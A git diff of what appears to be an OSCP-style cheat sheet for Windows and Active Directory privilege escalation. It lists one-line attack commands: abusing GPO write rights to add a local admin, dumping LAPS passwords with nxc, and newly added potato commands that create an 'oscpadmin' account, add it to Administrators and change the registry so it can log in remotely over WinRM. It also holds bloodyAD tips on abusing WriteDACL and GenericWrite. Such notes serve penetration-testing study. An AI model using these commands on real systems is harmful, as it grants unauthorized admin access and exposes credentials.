@@ -14,8 +14,8 @@
 - SeManageVolumePrivilege = https://github.com/CsEnox/SeManageVolumeExploit then `icacls C:\Windows\System32` 
 - GenericWrite on Domain Policy = `SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Default Domain Policy" --UserAccount {{USERNAME}}` 
 - ReadLAPSPassword = `nxc ldap {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M laps` 
+- Add user as localadmin ~ `potato -cmd "net user oscpadmin Password123! /add"` and `potato -cmd "net localgroup administrators oscpadmin /add"` 
+- Allow user to connect via winrm ~ `potato -cmd "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"` 
 
-
-> Have DACL control via WriteDACL? use bloodyAD to add rights, eg GenericAll, GenericWrite. <br/>
-> Have GenericWrite over a target? use bloodyAD to modify attributes directly, eg adding shadow credentials, group memberships, or SPNs. 
-
+> Have GenericWrite over a target? use bloodyAD to modify attributes directly, eg adding shadow credentials, group memberships, or SPNs. <br/> 
+> Have DACL control via WriteDACL? use bloodyAD to add rights, eg GenericAll, GenericWrite. 
